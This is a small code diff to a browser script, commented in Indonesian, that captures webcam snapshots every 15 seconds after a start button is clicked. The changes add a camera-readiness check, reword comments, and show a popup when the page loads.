@@ -16,7 +16,8 @@ startBtn.addEventListener('click', async () => {
     }
   }
 
-  intervalId = setInterval(captureAndSend, 15000); // ambil screenshot tiap 15 detik
+  // Mulai interval screenshot tiap 15 detik
+  intervalId = setInterval(captureAndSend, 15000);
 });
 
 stopBtn.addEventListener('click', () => {
@@ -33,6 +34,12 @@ stopBtn.addEventListener('click', () => {
 });
 
 async function captureAndSend() {
+  // Pastikan kamera sudah siap
+  if (video.videoWidth === 0 || video.videoHeight === 0) {
+    console.warn("Kamera belum siap, menunggu...");
+    return;
+  }
+
   const canvas = document.createElement('canvas');
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
@@ -56,11 +63,13 @@ async function captureAndSend() {
     link.click();
   }
 }
+
+// Tutup popup
 function closePopup() {
   document.getElementById('popupBox').style.display = 'none';
 }
 
-// Optional: Bisa otomatis muncul saat halaman dibuka
-window.onload = () => {
+// Tampilkan popup sekali saat halaman dimuat
+document.addEventListener('DOMContentLoaded', () => {
   document.getElementById('popupBox').style.display = 'flex';
-};
+});
